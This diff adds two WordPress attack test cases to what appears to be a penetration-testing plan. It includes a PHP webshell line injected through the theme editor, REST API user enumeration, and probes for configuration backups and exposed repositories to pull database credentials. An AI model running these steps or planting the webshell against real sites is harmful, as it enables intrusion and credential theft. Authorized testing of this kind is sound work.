@@ -156,3 +156,30 @@
 | **Expected Results** | Webshell is successfully uploaded through CMS administrative features; command execution is achieved via the webshell URL; persistence survives at least one CMS core update; automated scanners do not detect the webshell in default configuration |
 | **Remediation** | Disable theme/plugin file editing in wp-config.php (DISALLOW_FILE_EDIT=true); implement file integrity monitoring on CMS directories; restrict plugin installation to vetted sources only; deploy web application firewall rules to detect webshell patterns; audit installed plugins and themes regularly for unauthorized additions |
 | **Pass Criteria** | Webshell provides command execution with the web server user privileges; persistence mechanism survives CMS update; automated scanning does not flag the webshell in default configuration |
+
+---
+
+### TC-CMS-009: WordPress REST API Abuse and Theme-Editor RCE Chain
+
+| Field | Value |
+|------|------|
+| **ID** | TC-CMS-009 |
+| **Name** | WordPress REST API Abuse and Theme-Editor RCE Chain |
+| **Category** | F. CMS Exploitation |
+| **Severity** | CRITICAL |
+| **Prerequisites** | WordPress target with a low-privilege subscriber/contributor account obtained (weak credentials or registration open); default theme editor not disabled |
+| **Test Steps** | 1. Enumerate REST users: `curl -s http://target/wp-json/wp/v2/users`<br>2. Attempt privilege escalation via REST API user registration flaws on old versions (`/wp-json/wp/v2/users/register`)<br>3. With any admin/editor session, edit `functions.php` via the theme editor: POST to `/wp-admin/theme-editor.php` appending `system($_GET['c']);`<br>4. Trigger execution at `?c=id` and verify output<br>5. Alternatively abuse plugin upload (`/wp-admin/plugin-install.php`) with a malicious plugin zip |
+| **Expected Results** | Arbitrary PHP execution achieved via the theme/plugin editing surface with low-privilege starting point |
+
+### TC-CMS-010: CMS Backup, Staging, and Source Exposure Discovery
+
+| Field | Value |
+|------|------|
+| **ID** | TC-CMS-010 |
+| **Name** | CMS Backup, Staging, and Source Exposure Discovery |
+| **Category** | G. CMS Recon |
+| **Severity** | MEDIUM |
+| **Prerequisites** | CMS-identified target; authorized scope covers directory and file brute-forcing |
+| **Test Steps** | 1. Probe backup names: `curl -s -o /dev/null -w '%{http_code}' http://target/wp-config.php.bak`, `.old`, `~`, `.save`, `.txt` variants<br>2. Fuzz with ffuf + SecLists WordPress backup list<br>3. Check version-control exposure: `http://target/.git/config`, `.svn/entries`<br>4. Enumerate staging hosts via DNS brute (`staging.`, `dev.`, `test.` subdomains)<br>5. On any hit, extract DB credentials from `wp-config`/`settings.php` backups and validate against exposed services |
+| **Expected Results** | At least one backup or source artifact recovered, yielding credentials or source code for follow-on exploitation |
+
